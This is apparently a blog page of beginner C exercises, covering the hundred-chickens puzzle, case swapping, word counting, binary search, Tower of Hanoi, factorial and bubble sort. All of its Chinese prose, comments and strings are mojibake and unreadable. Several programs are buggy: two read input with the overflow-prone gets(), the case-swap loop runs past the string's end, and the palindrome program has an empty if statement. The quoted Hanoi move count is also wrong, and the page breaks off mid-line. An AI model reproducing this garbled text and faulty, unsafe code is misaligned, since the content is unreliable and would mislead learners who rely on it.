<p>å…¬é¸¡ä¸€åªäº”å…ƒï¼Œæ¯é¸¡ä¸€åªä¸‰å…ƒï¼Œå°é¸¡å´½å´½ä¸‰åªä¸€å…ƒã€‚</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> cock,hen,chick;</span><br><span class="line">	<span class="keyword">for</span>(cock=<span class="number">0</span>;cock&lt;=<span class="number">20</span>;cock++)<span class="comment">//100å…ƒå…¨ä¹°å…¬é¸¡å¯ä»¥ä¹°20åªï¼Œä¹Ÿå¯ä»¥ä¸ä¹° </span></span><br><span class="line">		<span class="keyword">for</span>(hen=<span class="number">0</span>;hen&lt;=<span class="number">33</span>;hen++)<span class="comment">//100å…ƒå…¨ä¹°æ¯é¸¡å¯ä»¥ä¹°33åªï¼Œä¹Ÿå¯ä»¥ä¸ä¹° </span></span><br><span class="line">			<span class="keyword">for</span>(chick=<span class="number">3</span>;chick&lt;=<span class="number">99</span>;chick++)<span class="comment">//100å…ƒå…¨ä¹°å°é¸¡æœ€å¤š99åªï¼Œä¸”æ˜¯3çš„å€æ•° </span></span><br><span class="line">				<span class="keyword">if</span>(cock*<span class="number">5</span>+hen*<span class="number">3</span>+chick/<span class="number">3</span>==<span class="number">100</span>)<span class="comment">//æ˜¯å¦èŠ±äº†100å…ƒ </span></span><br><span class="line">					<span class="keyword">if</span>(cock+hen+chick==<span class="number">100</span>)<span class="comment">//æ˜¯å¦æ€»å…±æœ‰100åª </span></span><br><span class="line">						<span class="keyword">if</span>(chick%<span class="number">3</span>==<span class="number">0</span>)<span class="comment">//ä¹°å°é¸¡çš„æ•°é‡æ˜¯å¦æ˜¯3çš„å€æ•° </span></span><br><span class="line">							<span class="built_in">printf</span>(<span class="string">&quot;cock:%d hen:%d chick:%d\n&quot;</span>,cock,hen,chick);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/bai.jpg"></p>
<h2 id="å¤§å°å†™äº’æ¢"><a href="#å¤§å°å†™äº’æ¢" class="headerlink" title="å¤§å°å†™äº’æ¢"></a>å¤§å°å†™äº’æ¢</h2><p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">char</span> ch[N];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸²å­—ç¬¦ï¼š\n&quot;</span>);</span><br><span class="line">	gets(ch);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ch[i]&gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp;ch[i]&lt;=<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">				ch[i]-=<span class="number">32</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(ch[i]&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;ch[i]&lt;=<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">					ch[i]+=<span class="number">32</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">puts</span>(ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/dx.jpg"></p>
<h2 id="å•è¯ä¸ªæ•°"><a href="#å•è¯ä¸ªæ•°" class="headerlink" title="å•è¯ä¸ªæ•°"></a>å•è¯ä¸ªæ•°</h2><p>ç¼–å†™ä¸€ä¸ªç¨‹åºè®°å½•è¿™è¡Œä¸€å…±æœ‰å¤šå°‘ä¸ªå•è¯ï¼  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> ch[N];</span><br><span class="line">	<span class="keyword">int</span> i,sum=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€å¥è¯ï¼š\n&quot;</span>);</span><br><span class="line">	gets(ch);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;ch[i]!=<span class="string">&#x27;\0&#x27;</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ch[i]!=<span class="string">&#x27; &#x27;</span>&amp;&amp;(ch[i+<span class="number">1</span>]==<span class="string">&#x27; &#x27;</span>||ch[i+<span class="number">1</span>]==<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					sum++;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ä¸€å…±æœ‰ %d ä¸ªå•è¯ï¼\n&quot;</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/1.jpg"></p>
<h2 id="äºŒåˆ†æŸ¥æ‰¾"><a href="#äºŒåˆ†æŸ¥æ‰¾" class="headerlink" title="äºŒåˆ†æŸ¥æ‰¾"></a>äºŒåˆ†æŸ¥æ‰¾</h2><p>è¾“å…¥ä¸€ä¸ªæ•°ï¼Œç¡®å®šå®ƒåœ¨æ•°ç»„ä¸­çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªæ•°è¾“å‡º-1ï¼Œå¦åˆ™è¾“å‡ºå®ƒçš„ä¸‹æ ‡ï¼</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t,h,e,m,n;</span><br><span class="line">	m=h=<span class="number">0</span>;</span><br><span class="line">	e=N<span class="number">-1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥%dä¸ªæ•´æ•°ï¼š\n&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		<span class="keyword">for</span>(j=N<span class="number">-1</span>;j&gt;i;j--)</span><br><span class="line">			<span class="keyword">if</span>(a[j]&gt;a[j<span class="number">-1</span>])</span><br><span class="line">				t=a[j],a[j]=a[j<span class="number">-1</span>],a[j<span class="number">-1</span>]=t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ­¤æ•°ç»„ï¼š&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥æ‚¨è¦æŸ¥æ‰¾çš„æ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">while</span>(h&lt;=e)</span><br><span class="line">	&#123;</span><br><span class="line">		m=(h+e)/<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span>(a[m]==n)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(n&gt;a[m])</span><br><span class="line">				e=m<span class="number">-1</span>;</span><br><span class="line">			 <span class="keyword">else</span> </span><br><span class="line">			 	h=m+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(h&lt;=e)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%dçš„ä¸‹æ ‡ä¸º%d\n&quot;</span>,n,m);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/2f.jpg"></p>
<h2 id="æ±‰æ´›å¡”"><a href="#æ±‰æ´›å¡”" class="headerlink" title="æ±‰æ´›å¡”"></a>æ±‰æ´›å¡”</h2><p><strong>æ±‰è¯ºå¡”</strong>ï¼ˆåˆç§°æ²³å†…å¡”ï¼‰é—®é¢˜æ˜¯æºäºå°åº¦ä¸€ä¸ªå¤è€ä¼ è¯´çš„ç›Šæ™ºç©å…·ã€‚å¤§æ¢µå¤©åˆ›é€ ä¸–ç•Œçš„æ—¶å€™åšäº†ä¸‰æ ¹é‡‘åˆšçŸ³æŸ±å­ï¼Œåœ¨ä¸€æ ¹æŸ±å­ä¸Šä»ä¸‹å¾€ä¸ŠæŒ‰ç…§å¤§å°é¡ºåºæ‘ç€64ç‰‡é»„é‡‘åœ†ç›˜ã€‚å¤§æ¢µå¤©å‘½ä»¤å©†ç½—é—¨æŠŠåœ†ç›˜ä»ä¸‹é¢å¼€å§‹æŒ‰å¤§å°é¡ºåºé‡æ–°æ‘†æ”¾åœ¨å¦ä¸€æ ¹æŸ±å­ä¸Šã€‚å¹¶ä¸”è§„å®šï¼Œåœ¨å°åœ†ç›˜ä¸Šä¸èƒ½æ”¾å¤§åœ†ç›˜ï¼Œåœ¨ä¸‰æ ¹æŸ±å­ä¹‹é—´ä¸€æ¬¡åªèƒ½ç§»åŠ¨ä¸€ä¸ªåœ†ç›˜ã€‚  </p>
<p>å‡å¦‚æ¯ç§’é’Ÿä¸€æ¬¡ï¼Œå…±éœ€å¤šé•¿æ—¶é—´å‘¢ï¼Ÿä¸€ä¸ªå¹³å¹´365å¤©æœ‰31536000 ç§’ï¼Œé—°å¹´366å¤©æœ‰31622400ç§’ï¼Œå¹³å‡æ¯å¹´31556952ç§’ï¼Œè®¡ç®—ä¸€ä¸‹ï¼š  </p>
<p>18446744073709511615ç§’  </p>
<p>è¿™è¡¨æ˜ç§»å®Œè¿™äº›é‡‘ç‰‡éœ€è¦5845.54äº¿å¹´ä»¥ä¸Šï¼Œè€Œåœ°çƒå­˜åœ¨è‡³ä»Šä¸è¿‡45äº¿å¹´ï¼Œå¤ªé˜³ç³»çš„é¢„æœŸå¯¿å‘½æ®è¯´ä¹Ÿå°±æ˜¯æ•°ç™¾äº¿å¹´ã€‚çœŸçš„è¿‡äº†<strong>5845.54äº¿å¹´</strong>ï¼Œä¸è¯´å¤ªé˜³ç³»å’Œé“¶æ²³ç³»ï¼Œè‡³å°‘åœ°çƒä¸Šçš„ä¸€åˆ‡ç”Ÿå‘½ï¼Œè¿åŒæ¢µå¡”ã€åº™å®‡ç­‰ï¼Œéƒ½æ—©å·²ç»ç°é£çƒŸç­ã€‚  </p>
<h2 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h2><p>â‘ ï¼š         å¦‚æœåªæœ‰ 1 ä¸ª åˆ™ ç›´æ¥ä» A æŸ± ç§»åŠ¨åˆ° C æŸ±  </p>
<p>â‘¡ï¼š&gt;1:   </p>
<p>1:             å°† n-1 ä¸ªç›˜å­ï¼Œä»  A  å€ŸåŠ©  C  ç§»åŠ¨åˆ°ï¼š  B  </p>
<p>2:             å°† A ä¸Šå‰©ä¸‹çš„ 1 ä¸ª ç›˜å­ç§»åŠ¨åˆ° C   </p>
<p>3:             å°† n-1 ä¸ªç›˜å­, ä» B   å€ŸåŠ©  A  ç§»åŠ¨åˆ°ï¼š  C     </p>
<p>æºä»£ç ï¼š   </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> s=<span class="number">0</span>,i=<span class="number">1</span>;	<span class="comment">//å…¨å±€å˜é‡ </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">h</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> a,<span class="keyword">char</span> b,<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%5d : %c------&gt;%c\n&quot;</span>,i++,a,c);		<span class="comment">//  ä¸€ä¸ªç›˜å­ ç›´æ¥ ä» A ----&gt; C </span></span><br><span class="line">			s++;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			h(n<span class="number">-1</span>,a,c,b);								<span class="comment">// å°† n-1 ä¸ªç›˜å­ï¼Œä»  A  å€ŸåŠ©  C  ç§»åŠ¨åˆ°ï¼š  B </span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%5d : %c------&gt;%c\n&quot;</span>,i++,a,c);		<span class="comment">// å°† A ä¸Šå‰©ä¸‹çš„ 1 ä¸ª ç›˜å­ç§»åŠ¨åˆ° C </span></span><br><span class="line">			h(n<span class="number">-1</span>,b,a,c);        						<span class="comment">// å°† n-1 ä¸ªç›˜å­, ä» B   å€ŸåŠ©  A  ç§»åŠ¨åˆ°ï¼š  C </span></span><br><span class="line">			s++;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥æœ‰å‡ ä¸ªç›˜å­ï¼š&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	</span><br><span class="line">	h(n,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%dä¸ªç›˜å­ä¾›éœ€ç§»åŠ¨ï¼š%dæ¬¡ï¼\n&quot;</span>,n,s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ:    </p>
<p><img src="/2019/08/12/OLD/hlt.jpg"></p>
<h2 id="çŒ´å­åƒæ¡ƒ"><a href="#çŒ´å­åƒæ¡ƒ" class="headerlink" title="çŒ´å­åƒæ¡ƒ"></a>çŒ´å­åƒæ¡ƒ</h2><p>çŒ´å­ç¬¬ä¸€å¤©æ‘˜ä¸‹è‹¥å¹²ä¸ªæ¡ƒå­ï¼Œå½“å³åƒäº†ä¸€åŠï¼Œè¿˜ä¸è¿‡ç˜¾ï¼Œåˆå¤šåƒäº†ä¸€ä¸ªã€‚ç¬¬äºŒå¤©æ—©ä¸Šåˆå°†ç¬¬ä¸€å¤©å‰©ä¸‹çš„æ¡ƒå­åƒæ‰ä¸€åŠï¼Œæœ‰å¤šåƒäº†ä¸€ä¸ªã€‚ä»¥åæ¯å¤©æ—©ä¸Šéƒ½åƒäº†å‰ä¸€å¤©å‰©ä¸‹çš„ä¸€åŠé›¶ä¸€ä¸ªã€‚åˆ°ç¬¬ 10 å¤©æ—©ä¸Šæƒ³å†åƒæ—¶ï¼Œå‘ç°åªå‰©ä¸‹ä¸€ä¸ªæ¡ƒå­äº†ã€‚æ±‚ä¸€å…±æœ‰å¤šå°‘ä¸ªæ¡ƒ!</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*çŒ´å­ç¬¬ä¸€å¤©æ‘˜ä¸‹è‹¥å¹²ä¸ªæ¡ƒå­ï¼Œå½“å³åƒäº†ä¸€åŠï¼Œè¿˜ä¸è¿‡ç˜¾ï¼Œåˆå¤šåƒäº†ä¸€ä¸ªã€‚</span></span><br><span class="line"><span class="comment">ç¬¬äºŒå¤©æ—©ä¸Šåˆå°†ç¬¬ä¸€å¤©å‰©ä¸‹çš„æ¡ƒå­åƒæ‰ä¸€åŠï¼Œæœ‰å¤šåƒäº†ä¸€ä¸ªã€‚</span></span><br><span class="line"><span class="comment">ä»¥åæ¯å¤©æ—©ä¸Šéƒ½åƒäº†å‰ä¸€å¤©å‰©ä¸‹çš„ä¸€åŠé›¶ä¸€ä¸ªã€‚</span></span><br><span class="line"><span class="comment">åˆ°ç¬¬ 10 å¤©æ—©ä¸Šæƒ³å†åƒæ—¶ï¼Œå‘ç°åªå‰©ä¸‹ä¸€ä¸ªæ¡ƒå­äº†ã€‚ç¼–</span></span><br><span class="line"><span class="comment">å†™ç¨‹åºæ±‚çŒ´å­ç¬¬ä¸€å¤©æ‘˜äº†å¤šå°‘ä¸ªæ¡ƒå­*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> day,peach_before,peach_after=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(day=<span class="number">10</span>;day&gt;<span class="number">1</span>;day--)	<span class="comment">// ç»¼ä¸Šæ‰€è¿° æœ€åä¸€å¤©è¿˜å‰©ä¸€ä¸ªæ¡ƒï¼Œæ•…ï¼šä»åå¾€å‰æ¨ </span></span><br><span class="line">		&#123;</span><br><span class="line">			peach_before=(peach_after+<span class="number">1</span>)*<span class="number">2</span>;	<span class="comment">// å‰ä¸€å¤©çš„æ¡ƒå­æ€»æ•° == ï¼ˆåä¸€å¤©çš„æ¡ƒå­æ€»æ•° + 1 ï¼‰ * 2 </span></span><br><span class="line">			peach_after = peach_before;		<span class="comment">// ä¹‹åçš„ä¸€å¤©çš„æ•°é‡ == åˆšåˆšå¾—åˆ°çš„ç»“æœ </span></span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ€»å…±æœ‰ %d ä¸ªæ¡ƒï¼\n&quot;</span>,peach_before);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/tz.jpg"></p>
<h2 id="å›æ–‡æ•°"><a href="#å›æ–‡æ•°" class="headerlink" title="å›æ–‡æ•°"></a>å›æ–‡æ•°</h2><p>â€œå›æ–‡â€æ˜¯æŒ‡æ­£è¯»åè¯»éƒ½èƒ½è¯»é€šçš„å¥å­ï¼Œå®ƒæ˜¯å¤ä»Šä¸­å¤–éƒ½æœ‰çš„ä¸€ç§ä¿®è¾æ–¹å¼å’Œæ–‡å­—æ¸¸æˆï¼Œå¦‚â€œæˆ‘ä¸ºäººäººï¼Œäººäººä¸ºæˆ‘â€ç­‰ã€‚åœ¨æ•°å­¦ä¸­ä¹Ÿæœ‰è¿™æ ·ä¸€ç±»æ•°å­—æœ‰è¿™æ ·çš„ç‰¹å¾ï¼Œæˆä¸ºå›æ–‡æ•°ï¼ˆpalindrome number</p>
<p>è®¾næ˜¯ä¸€ä»»æ„è‡ªç„¶æ•°ã€‚è‹¥å°†nçš„å„ä½æ•°å­—åå‘æ’åˆ—æ‰€å¾—è‡ªç„¶æ•°n1ä¸nç›¸ç­‰ï¼Œåˆ™ç§°nä¸ºä¸€å›æ–‡æ•°ã€‚ä¾‹å¦‚ï¼Œè‹¥n=1234321ï¼Œåˆ™ç§°nä¸ºä¸€å›æ–‡æ•°ï¼›ä½†è‹¥n=1234567ï¼Œåˆ™nä¸æ˜¯å›æ–‡æ•°ã€‚  </p>
<p>ç®€å•æ¥è¯´ï¼š æ­£è¯»ä¸åè¯»éƒ½ä¸€æ ·ï¼  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">h_h</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,m;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;x;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			j=i;</span><br><span class="line">			m=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(j)</span><br><span class="line">				&#123;</span><br><span class="line">					m=m*<span class="number">10</span>+j%<span class="number">10</span>;</span><br><span class="line">					j/=<span class="number">10</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">if</span>(i==m)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,i);</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,y,i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªèŒƒå›´ å¦‚ï¼š100\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	<span class="keyword">if</span>(h_h(x));</span><br><span class="line">		</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/6.png"></p>
<h2 id="é˜¶ä¹˜"><a href="#é˜¶ä¹˜" class="headerlink" title="é˜¶ä¹˜"></a>é˜¶ä¹˜</h2><p>æ¯”å¦‚ 5ï¼=5X4X3X2X1  =120</p>
<p>6! =6X5X4X3X2X1  =720</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,i;</span><br><span class="line">	<span class="keyword">double</span> sum=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=a;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum*=i;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d!=%f\n&quot;</span>,a,sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/j.jpg"></p>
<h2 id="å†’æ³¡æ³•æ’åº"><a href="#å†’æ³¡æ³•æ’åº" class="headerlink" title="å†’æ³¡æ³•æ’åº"></a>å†’æ³¡æ³•æ’åº</h2><p>å†’æ³¡æ³•æ’åºï¼š  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥%dä¸ªæ•°ï¼š\n&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=N<span class="number">-1</span>;j&gt;i;j--)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(a[j]&gt;a[j<span class="number">-1</span>])          <span class="comment">// &gt; ä¸ºé™åºï¼Œ&lt; ä¸ºå‡åº</span></span><br><span class="line">						&#123;</span><br><span class="line">							t=a[j],a[j]=a[j<span class="number">-1</span>],a[j<span class="number">-1</span>]=t;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;å†’æ³¡æ³•æ’åº é™åºï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/7.png"></p>
<h2 id="x-2-0-amp-amp-x-3-0"><a href="#x-2-0-amp-amp-x-3-0" class="headerlink" title="x%2==0&amp;&amp;x%3==0"></a>x%2==0&amp;&amp;x%3==0</h2><p>è¾“å…¥ä¸€äº›æ­£æ•´æ•°ï¼ˆä»¥0è¡¨ç¤ºç»“æŸï¼‰ï¼Œç»Ÿè®¡å¹¶è¾“å‡ºèƒ½è¢«3æ•´é™¤çš„å¶æ•°çš„æ•°åŠä¸ªæ•°ï¼  </p>
<p>æºä»£ç ï¼š </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,s=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€äº›æ­£æ•´æ•°(ä»¥0ç»“æŸ)ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">			<span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>&amp;&amp;i%<span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						s++;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,i);</span><br><span class="line">					&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">if</span>(s==<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;â€”â€”â€”â€”èƒ½è¢«3æ•´é™¤çš„å¶æ•° 